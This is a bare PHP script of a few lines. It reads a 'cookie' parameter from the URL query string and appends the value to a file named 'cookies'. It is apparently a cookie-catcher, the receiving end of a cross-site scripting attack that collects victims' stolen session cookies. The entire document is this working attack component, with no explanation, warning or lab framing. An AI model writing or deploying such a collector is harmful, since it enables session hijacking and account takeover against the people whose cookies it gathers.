<?php
	if(isset($_GET['cookie'])){
		$file = fopen("cookies","a+");
		fwrite($file,$_GET['cookie']);
		fclose($file);
	}
?>
